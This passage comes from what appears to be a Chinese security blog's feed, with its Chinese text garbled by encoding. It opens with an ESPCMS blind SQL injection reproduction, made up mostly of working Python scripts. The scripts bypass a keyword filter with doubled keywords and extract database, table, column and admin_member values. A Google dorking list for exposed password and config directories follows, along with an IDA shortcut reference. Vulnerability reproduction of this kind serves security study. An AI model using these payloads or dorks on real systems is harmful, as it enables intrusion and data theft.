src="https://z3.ax1x.com/2021/11/25/oArFKA.png" alt="oArFKA.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=2 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›ç»“æœä¸ºå‡<img src="https://z3.ax1x.com/2021/11/25/oArAbt.png" alt="oArAbt.png"></p><p>å¯ä»¥å°†â€æš‚æ— å†…å®¹â€è®¾ä¸ºç›²æ³¨çš„æ ‡å‡†</p><p>æµ‹è¯•æ³¨å…¥æ•°æ®åº“é•¿åº¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or (seleselectct length(database())=9)  %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/25/oAre58.png" alt="oAre58.png"></p><p>ç›¸ç¬¦åˆï¼Œå…¶ä»–çš„ç”¨è„šæœ¬å°±èƒ½è·‘å‡ºæ¥</p><h2 id="è„šæœ¬æ¼”ç¤º"><a href="#è„šæœ¬æ¼”ç¤º" class="headerlink" title="è„šæœ¬æ¼”ç¤º"></a>è„šæœ¬æ¼”ç¤º</h2><h3 id="çˆ†æ•°æ®åº“é•¿åº¦"><a href="#çˆ†æ•°æ®åº“é•¿åº¦" class="headerlink" title="çˆ†æ•°æ®åº“é•¿åº¦"></a>çˆ†æ•°æ®åº“é•¿åº¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(database()))={} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token comment"># 9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†æ•°æ®åº“å"><a href="#çˆ†æ•°æ®åº“å" class="headerlink" title="çˆ†æ•°æ®åº“å"></a>çˆ†æ•°æ®åº“å</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>database_length <span class="token operator">=</span> <span class="token number">9</span>database_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> database_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct database()),{0}, 1))={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            database_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''eesespespcespcmespcmsespcms_espcms_vespcms_v5'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†è¡¨çš„é•¿åº¦ï¼ˆç¬¬ä¸€ä¸ªè¡¨ï¼‰"><a href="#çˆ†è¡¨çš„é•¿åº¦ï¼ˆç¬¬ä¸€ä¸ªè¡¨ï¼‰" class="headerlink" title="çˆ†è¡¨çš„é•¿åº¦ï¼ˆç¬¬ä¸€ä¸ªè¡¨ï¼‰"></a>çˆ†è¡¨çš„é•¿åº¦ï¼ˆç¬¬ä¸€ä¸ªè¡¨ï¼‰</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(table_name) frfromom information_schema.tables whwhereere table_schema=database() limit 0,1)={} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 19</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦çˆ†å…¶ä»–è¡¨å¯ä»¥åœ¨<code>limit</code>çš„ç¬¬ä¸€å‚æ•°æ›´æ”¹ï¼Œæˆ–è€…å†åŠ ä¸€ä¸ªå¾ªç¯</p><h3 id="çˆ†è¡¨å"><a href="#çˆ†è¡¨å" class="headerlink" title="çˆ†è¡¨å"></a>çˆ†è¡¨å</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>table_length <span class="token operator">=</span> <span class="token number">19</span>table_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> table_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct table_name frfromom information_schema.tables whwhereere table_schema=database() limit 0,1),{0}, 1))={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            table_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment"># xxxxxxxadmin_member</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†åˆ—çš„é•¿åº¦"><a href="#çˆ†åˆ—çš„é•¿åº¦" class="headerlink" title="çˆ†åˆ—çš„é•¿åº¦"></a>çˆ†åˆ—çš„é•¿åº¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(column_name) frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1)={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†åˆ—å"><a href="#çˆ†åˆ—å" class="headerlink" title="çˆ†åˆ—å"></a>çˆ†åˆ—å</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>column_length <span class="token operator">=</span> <span class="token number">2</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span>column_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> column_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct column_name frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1),{1}, 1))={2} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            column_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment"># id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†å€¼çš„é•¿åº¦"><a href="#çˆ†å€¼çš„é•¿åº¦" class="headerlink" title="çˆ†å€¼çš„é•¿åº¦"></a>çˆ†å€¼çš„é•¿åº¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>column_name <span class="token operator">=</span> <span class="token string">'id'</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length({0}) frfromom {1} limit 0,1)={2} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> table_name<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çˆ†å€¼"><a href="#çˆ†å€¼" class="headerlink" title="çˆ†å€¼"></a>çˆ†å€¼</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>key_length <span class="token operator">=</span> <span class="token number">1</span>column_name <span class="token operator">=</span> <span class="token string">"id"</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span>key_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> key_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct {0} frfromom {1} limit 0,1),{2},1))={3} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> table_name<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"æš‚æ— å†…å®¹"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            key_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>key_name<span class="token punctuation">)</span><span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹è¡¨ä¸­æ•°æ®ç›¸ç¬¦ï¼Œè¿™å°±æ˜¯æ•´ä¸ªæµç¨‹ï¼Œå½“ç„¶å¯ä»¥ç›´æ¥æ”¾åœ¨sqlmapé‡Œè·‘</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDAä½¿ç”¨æ•™ç¨‹</title>
      <link href="/2021/11/23/ida-shi-yong-jiao-cheng/"/>
      <url>/2021/11/23/ida-shi-yong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="IDAä½¿ç”¨æ•™ç¨‹"><a href="#IDAä½¿ç”¨æ•™ç¨‹" class="headerlink" title="IDAä½¿ç”¨æ•™ç¨‹"></a>IDAä½¿ç”¨æ•™ç¨‹</h1><h2 id="å¿«æ·é”®"><a href="#å¿«æ·é”®" class="headerlink" title="å¿«æ·é”®"></a>å¿«æ·é”®</h2><table><thead><tr><th>ç©ºæ ¼é”®</th><th>åˆ‡æ¢è§†å›¾</th></tr></thead><tbody><tr><td>ESC</td><td>è¿”å›ä¸Šä¸€æ¬¡æ“ä½œ</td></tr><tr><td>C</td><td>åˆ‡æ¢ä¸ºä»£ç </td></tr><tr><td>D</td><td>åˆ‡æ¢ä¸ºæ•°æ®</td></tr><tr><td>A</td><td>åˆ‡æ¢ä¸ºasciiå­—ç¬¦ä¸²</td></tr><tr><td>U</td><td>å–æ¶ˆå®šä¹‰å‡½æ•°ï¼Œä»£ç ï¼Œæ•°æ®çš„å®šä¹‰</td></tr><tr><td>G</td><td>æœç´¢åœ°å€è·³è½¬</td></tr><tr><td>N</td><td>é‡å‘½å</td></tr><tr><td>Y</td><td>æ›´æ”¹å˜é‡ç±»å‹</td></tr><tr><td>X</td><td>æŸ¥çœ‹å‡½æ•°ï¼Œå˜é‡çš„äº¤å‰å¼•ç”¨</td></tr><tr><td>:</td><td>æ³¨é‡Š</td></tr><tr><td>;</td><td>é‡å¤æ³¨é‡Š</td></tr><tr><td>Shift+F12</td><td>æ‰“å¼€Stringsçª—å£</td></tr><tr><td>Alt+M</td><td>æ·»åŠ æ ‡ç­¾</td></tr><tr><td>Ctrl+M</td><td>æŸ¥çœ‹æ ‡ç­¾</td></tr><tr><td>Ctrl+S</td><td>æŸ¥çœ‹æ®µä¿¡æ¯</td></tr><tr><td>Ctrl+W</td><td>ä¿å­˜IDAæ•°æ®åº“</td></tr><tr><td>Alt+T</td><td>æœç´¢æ–‡æœ¬</td></tr><tr><td>Alt+B</td><td>æœç´¢16è¿›åˆ¶æ–‡æœ¬</td></tr><tr><td>Ctrl+Shift+W</td><td>æ‹æ‘„å¿«ç…§</td></tr><tr><td>F5</td><td>åæ±‡ç¼–</td></tr><tr><td>F12</td><td>å‡½æ•°æµç¨‹å›¾</td></tr><tr><td>Ctrl+F12</td><td>å‡½æ•°è°ƒç”¨å›¾</td></tr><tr><td>Alt+D</td><td>è®¾ç½®æ•°æ®ç±»å‹</td></tr><tr><td>Shift+F1</td><td>æŸ¥çœ‹æœ¬åœ°å¯¼å…¥çš„ç±»å‹</td></tr></tbody></table><h2 id="å‡½æ•°åç§°"><a href="#å‡½æ•°åç§°" class="headerlink" title="å‡½æ•°åç§°"></a>å‡½æ•°åç§°</h2><table><thead><tr><th>è“è‰²</th><th>å¸¸è§„çš„æŒ‡ä»¤å‡½æ•°</th></tr></thead><tbody><tr><td>é»‘è‰²</td><td>èŠ‚å’ŒèŠ‚ä¹‹é—´çš„é—´éš™</td></tr><tr><td>ç™½è‰²</td><td>æ•°æ®å†…å®¹</td></tr><tr><td>ç²‰è‰²</td><td>å¤–éƒ¨å¯¼å…¥ç¬¦å·</td></tr><tr><td>æš—é»„è‰²</td><td>IDAä¸ºè¯†åˆ«çš„å†…å®¹</td></tr></tbody></table><h2 id="çª—å£"><a href="#çª—å£" class="headerlink" title="çª—å£"></a>çª—å£</h2><table><thead><tr><th>IDA View</th><th>ä¸¤ç§è§†å›¾ï¼Œå›¾å½¢ï¼Œæ–‡æœ¬ï¼Œç©ºæ ¼é”®åˆ‡æ¢</th></tr></thead><tbody><tr><td>Hex View</td><td>16è¿›åˆ¶çª—å£ï¼Œå’Œwinhexé•¿å¾—å·®ä¸å¤š</td></tr><tr><td>Structures</td><td>ç»“æ„ä½“çª—å£</td></tr><tr><td>Enums</td><td>æšä¸¾çª—å£</td></tr><tr><td>Imports</td><td>å¯¼å…¥å‡½æ•°</td></tr><tr><td>Exports</td><td>å¯¼å‡ºå‡½æ•°</td></tr><tr><td>Strings</td><td>å­—ç¬¦ä¸²çª—å£</td></tr></tbody></table><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><p><img src="https://z3.ax1x.com/2021/11/25/oADanI.png" alt="oADanI.png"></p><ol><li>æœ€å‰é¢ä¸€åˆ—çš„åœ°å€</li><li>IDAè‡ªåŠ¨ä¸ºä½ åŠ ä¸Šè¯­å¥çš„æ³¨é‡Š</li><li>16è¿›åˆ¶æ˜¾ç¤º</li></ol><h3 id="åˆ›å»ºæ•°ç»„"><a href="#åˆ›å»ºæ•°ç»„" class="headerlink" title="åˆ›å»ºæ•°ç»„"></a>åˆ›å»ºæ•°ç»„</h3><p>é€‰ä¸­æƒ³è¦è½¬æ¢æˆæ•°ç»„çš„æ•°æ®å—ï¼ŒEdit-&gt;Array</p><p><img src="https://z3.ax1x.com/2021/11/25/oADwHP.png" alt="oADwHP.png"></p><h3 id="åˆ›å»ºç»“æ„ä½“"><a href="#åˆ›å»ºç»“æ„ä½“" class="headerlink" title="åˆ›å»ºç»“æ„ä½“"></a>åˆ›å»ºç»“æ„ä½“</h3><p>è¿›å…¥Structuresçª—å£ï¼Œå³é”®hide/unhideï¼ŒæŸ¥çœ‹éšè—ç»“æ„ä½“ï¼Œinsertåˆ›å»ºç»“æ„ä½“</p><p>Dåˆ›å»ºç»“æ„ä½“æ•°æ®ï¼Œdeleteåˆ é™¤ç»“æ„ä½“</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hacking ä½¿ç”¨</title>
      <link href="/2021/11/22/google-hacking/"/>
      <url>/2021/11/22/google-hacking/</url>
      
        <content type="html"><![CDATA[<h1 id="google-hacking-ä½¿ç”¨"><a href="#google-hacking-ä½¿ç”¨" class="headerlink" title="google hacking ä½¿ç”¨"></a>google hacking ä½¿ç”¨</h1><h2 id="åŒ¹é…æ–¹å¼"><a href="#åŒ¹é…æ–¹å¼" class="headerlink" title="åŒ¹é…æ–¹å¼"></a>åŒ¹é…æ–¹å¼</h2><ol><li><code>"test"</code>å…¨éƒ¨åŒ¹é…</li><li><code>test and text</code>é€»è¾‘ä¸å…¨åŒ¹é…</li><li><code>test or text</code>é€»è¾‘æˆ–åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ª</li><li><code>-test</code>é€»è¾‘éä¸åŒ¹é…</li><li><code>+ * ?</code>é€šé…ç¬¦</li><li><code>1..3</code>åŒ¹é…æ•°å­—èŒƒå›´</li></ol><h2 id="åŒ¹é…å…³é”®å­—"><a href="#åŒ¹é…å…³é”®å­—" class="headerlink" title="åŒ¹é…å…³é”®å­—"></a>åŒ¹é…å…³é”®å­—</h2><ol><li><code>intitle:test</code>åªåŒ¹é…æ ‡é¢˜ä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µ</li><li><code>allintitle:test text</code>åªåŒ¹é…æ ‡é¢˜ä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µï¼ŒåŒ¹é…ä»»æ„ä¸€ä¸ªï¼Œç›¸å½“äºor</li><li><code>inurl:test</code>åªåŒ¹é…urlä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µ</li><li><code>allinurl:test text</code>åªåŒ¹é…urlä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µï¼ŒåŒ¹é…ä»»æ„ä¸€ä¸ªï¼Œç›¸å½“äºor</li><li><code>intext:test</code>åªåŒ¹é…æ­£æ–‡ä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µ</li><li><code>allintext:test text</code>åªåŒ¹é…æ­£æ–‡ä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µï¼ŒåŒ¹é…ä»»æ„ä¸€ä¸ªï¼Œç›¸å½“äºor</li><li><code>inanchor:test</code>åªåŒ¹é…å¸¦è¶…é“¾æ¥çš„é”šæ–‡å­—ä¸­åŒ…å«å…³é”®å­—çš„é¡µé¢</li><li><code>allinanchor:test text</code>åªåŒ¹é…å¸¦è¶…é“¾æ¥çš„é”šæ–‡å­—ä¸­åŒ…å«å…³é”®å­—çš„ç½‘é¡µï¼ŒåŒ¹é…ä»»æ„ä¸€ä¸ªï¼Œç›¸å½“äºor</li></ol><h2 id="åŒ¹é…æŒ‡å®šé“¾æ¥"><a href="#åŒ¹é…æŒ‡å®šé“¾æ¥" class="headerlink" title="åŒ¹é…æŒ‡å®šé“¾æ¥"></a>åŒ¹é…æŒ‡å®šé“¾æ¥</h2><ol><li><code>site:url</code>åŒ¹é…æŒ‡å®šurlçš„ç½‘é¡µ</li><li><code>-site:url</code>ä¸åŒ¹é…æŒ‡å®šurlçš„ç½‘é¡µ</li><li><code>link:url</code>åŒ¹é…é“¾æ¥åˆ°æŒ‡å®šurlä¸Šçš„ç½‘é¡µ</li><li><code>cache:url</code>åŒ¹é…urlä¸‹å‚¨å­˜çš„ç½‘é¡µç¼“å­˜</li><li><code>related:url</code>åŒ¹é…ä¸urlç›¸ä¼¼çš„ç½‘é¡µ</li><li><code>info:url</code>åŒ¹é…æŒ‡å®šç«™ç‚¹çš„ç½‘é¡µ</li></ol><h2 id="åŒ¹é…ç±»å‹"><a href="#åŒ¹é…ç±»å‹" class="headerlink" title="åŒ¹é…ç±»å‹"></a>åŒ¹é…ç±»å‹</h2><ol><li><code>filetype:pdf</code>åŒ¹é…æŒ‡å®šè®¿é—®çš„æ–‡ä»¶ç±»å‹</li></ol><h2 id="åŒ¹é…ç›®å½•"><a href="#åŒ¹é…ç›®å½•" class="headerlink" title="åŒ¹é…ç›®å½•"></a>åŒ¹é…ç›®å½•</h2><ul><li>index of /admin</li><li>index of /passwd</li><li>index of /password</li><li>index of /mail</li><li>â€œindex of /â€œ +passwd</li><li>â€œindex of /â€œ +password.txt</li><li>â€œindex of /â€œ +.htaccess</li><li>â€œindex of /rootâ€</li><li>â€œindex of /cgi-binâ€</li><li>â€œindex of /logsâ€</li><li>â€œindex of /configâ€</li></ul>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰è£…</title>
      <link href="/2021/11/06/java-an-zhuang/"/>
      <url>/2021/11/06/java-an-zhuang/</url>
      
